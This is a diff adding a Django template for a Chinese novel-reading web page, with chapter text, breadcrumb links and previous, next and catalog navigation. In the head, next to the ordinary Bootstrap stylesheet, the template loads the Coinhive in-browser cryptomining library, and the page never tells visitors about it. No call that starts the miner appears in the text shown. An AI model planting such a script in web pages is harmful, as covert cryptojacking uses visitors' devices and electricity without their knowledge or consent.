@@ -1,0 +1,52 @@
+﻿{% load staticfiles %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+     <meta name="description"  content="{{ name }}在线阅读,{{ name }} {{ title }}">
+     <meta name="keywords"  content="{{ name }}在线阅读，{{ name }},{{ name }}免费, {{ name }} {{ title }}">
+    <title>{{ title }}</title>
+    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+</head>
+<body class="read-bg" >
+<div class=" read-body container">
+    <h1 class="text-center read-title">{{ name }} {{ title }}</h1>
+            <ol class="breadcrumb text-left">
+  <li><a href="{% url 'index' %}">首页</a></li>
+  <li class="active"><a href="{% url 'catalog' id book_id %}?name={{ name }}">源列表</a></li>
+</ol>
+    <div class="con-text">
+        {% for text in body %}
+            <p>{{ text }}</p>
+        {% endfor %}
+    </div>
+</div>
+<footer class="footer">
+    <nav aria-label="... footer-nav">
+        <ul class="pager nav_ul">
+            {% if last < 0 %}
+                <li><a class="fot_nav nav_left" href="{% url 'catalog' id book_id %}?name={{ name }}">上一章</a></li>
+            {% else %}
+                <li><a class="fot_nav nav_left" href="{% url 'read' id book_id last %}?name={{name}}">上一章</a></li>
+            {% endif %}
+                <li><a class="fot_nav" href="/catalog/{{ id }}/{{ book_id }}/?name={{ name }}">目录</a></li>
+            {% if next == -99%}
+                <li><a class="fot_nav nav_right" href="{% url 'catalog' id book_id %}?name={{ name }}">下一章</a></li>
+            {% else %}
+                <li><a class="fot_nav nav_right" href="{% url 'read' id book_id next %}?name={{name}}">下一章</a></li>
+            {% endif %}
+        </ul>
+    </nav>
+  <div class="container">
+    <p class="text-center ">本站所收录作品均来自互联网
+         <br />
+        蜀ICP备17035299号
+    </p>
+  </div>
+
+</footer>
+</body>
+</html>
